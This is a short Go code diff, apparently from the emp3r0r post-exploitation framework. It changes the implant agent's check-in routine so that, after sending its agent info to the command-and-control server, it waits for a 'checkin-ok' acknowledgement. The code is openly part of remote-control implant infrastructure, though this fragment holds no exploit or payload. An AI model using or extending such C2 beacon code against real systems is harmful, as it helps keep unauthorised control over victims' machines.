@@ -46,10 +46,24 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 
 	out := cbor.NewEncoder(secureConn)
 	err = out.Encode(info)
-	if err == nil {
-		logging.Infof("Checked in")
+	if err != nil {
+		return fmt.Errorf("encode agent info: %v", err)
 	}
-	return err
+
+	// Wait for ACK from server
+	// This ensures the server has processed our check-in before we close the connection
+	// especially important for polling-based transports like plain_http
+	dec := cbor.NewDecoder(secureConn)
+	var ack def.MsgTunData
+	if err = dec.Decode(&ack); err != nil {
+		return fmt.Errorf("decode checkin ACK: %v", err)
+	}
+	if ack.Tag != "checkin-ok" {
+		return fmt.Errorf("invalid checkin ACK tag: %s", ack.Tag)
+	}
+
+	logging.Infof("Checked in (verified by server)")
+	return nil
 }
 
 // CheckC2Condition check preflight
